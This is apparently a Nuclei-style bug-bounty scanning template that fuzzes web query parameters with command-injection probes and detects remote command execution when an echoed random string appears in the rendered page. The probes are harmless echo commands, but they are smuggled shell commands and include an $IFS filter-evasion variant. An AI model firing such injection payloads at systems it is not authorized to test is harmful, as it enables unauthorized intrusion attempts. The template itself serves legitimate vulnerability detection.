id: bugbounty-rce

info:
  name: RCE via Params
  author: Justin Washek
  severity: critical
  description: |
    Fuzzes each query param with harmless RCE payloads like `;echo {{randstr_1}}` and detects if command output is rendered in DOM.
  tags: rce,headless,fuzzing,commandinjection

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitload

      - action: script
        name: echo_check
        args:
          code: |
            () => {
              return document.body.innerText.includes('{{randstr_1}}') ? '{{randstr_1}}' : ''
            }

    fuzzing:
      - part: query
        mode: single
        fuzz:
          - ";echo {{randstr_1}}"
          - "|echo {{randstr_1}}"
          - "&& echo {{randstr_1}}"
          - "`echo {{randstr_1}}`"
          - "$(echo {{randstr_1}})"
          - ";echo$IFS{{randstr_1}}"
          - "$(cat<<<{{randstr_1}})"

    matchers:
      - type: word
        part: echo_check
        words:
          - "{{randstr_1}}"

    extractors:
      - type: kval
        part: echo_check
        kval:
          - echo_check
